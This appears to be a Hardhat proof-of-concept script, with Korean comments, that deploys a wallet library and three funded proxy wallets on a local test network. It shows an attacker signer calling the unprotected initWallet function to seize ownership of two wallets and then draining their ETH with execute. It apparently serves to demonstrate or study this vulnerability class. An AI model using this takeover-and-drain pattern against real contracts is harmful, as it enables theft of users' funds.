const hre = require("hardhat");

async function main() {
  const [deployer, legitOwner, attacker] = await hre.ethers.getSigners();

  console.log("Deployer:", deployer.address);
  console.log("Legit owner:", legitOwner.address);
  console.log("Attacker:", attacker.address);

  const Library = await hre.ethers.getContractFactory("WalletLibrary");
  const library = await Library.deploy();
  await library.waitForDeployment();

  const libraryAddress = await library.getAddress();
  console.log("WalletLibrary deployed to:", libraryAddress);

  const Wallet = await hre.ethers.getContractFactory("Wallet");

  const wallet1 = await Wallet.deploy(libraryAddress, {
    value: hre.ethers.parseEther("3")
  });
  await wallet1.waitForDeployment();

  const wallet2 = await Wallet.deploy(libraryAddress, {
    value: hre.ethers.parseEther("3")
  });
  await wallet2.waitForDeployment();

  const wallet3 = await Wallet.deploy(libraryAddress, {
    value: hre.ethers.parseEther("3")
  });
  await wallet3.waitForDeployment();

  const wallet1Address = await wallet1.getAddress();
  const wallet2Address = await wallet2.getAddress();
  const wallet3Address = await wallet3.getAddress();

  console.log("Wallet1:", wallet1Address);
  console.log("Wallet2:", wallet2Address);
  console.log("Wallet3:", wallet3Address);

  const wallet1AsLibrary = await hre.ethers.getContractAt("WalletLibrary", wallet1Address);
  const wallet2AsLibrary = await hre.ethers.getContractAt("WalletLibrary", wallet2Address);
  const wallet3AsLibrary = await hre.ethers.getContractAt("WalletLibrary", wallet3Address);

  // Wallet1은 정상 초기화
  await wallet1AsLibrary.connect(legitOwner).initWallet(legitOwner.address, 1);
  console.log("Wallet1 initialized legitimately");

  // Wallet2, Wallet3는 공격자가 initWallet 호출해서 owner 탈취
  await wallet2AsLibrary.connect(attacker).initWallet(attacker.address, 1);
  await wallet3AsLibrary.connect(attacker).initWallet(attacker.address, 1);
  console.log("Wallet2 and Wallet3 initialized by attacker");

  console.log("Wallet1 owner:", await wallet1AsLibrary.owner());
  console.log("Wallet2 owner:", await wallet2AsLibrary.owner());
  console.log("Wallet3 owner:", await wallet3AsLibrary.owner());

  console.log(
    "Before attack Wallet2 balance:",
    hre.ethers.formatEther(await wallet2.getBalance()),
    "ETH"
  );

  console.log(
    "Before attack Wallet3 balance:",
    hre.ethers.formatEther(await wallet3.getBalance()),
    "ETH"
  );

  // 공격자가 owner가 되었으므로 execute 가능
  await wallet2AsLibrary
    .connect(attacker)
    .execute(attacker.address, hre.ethers.parseEther("3"));

  await wallet3AsLibrary
    .connect(attacker)
    .execute(attacker.address, hre.ethers.parseEther("3"));

  console.log("Wallet2 and Wallet3 drained by attacker");

  console.log(
    "After attack Wallet2 balance:",
    hre.ethers.formatEther(await wallet2.getBalance()),
    "ETH"
  );

  console.log(
    "After attack Wallet3 balance:",
    hre.ethers.formatEther(await wallet3.getBalance()),
    "ETH"
  );
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});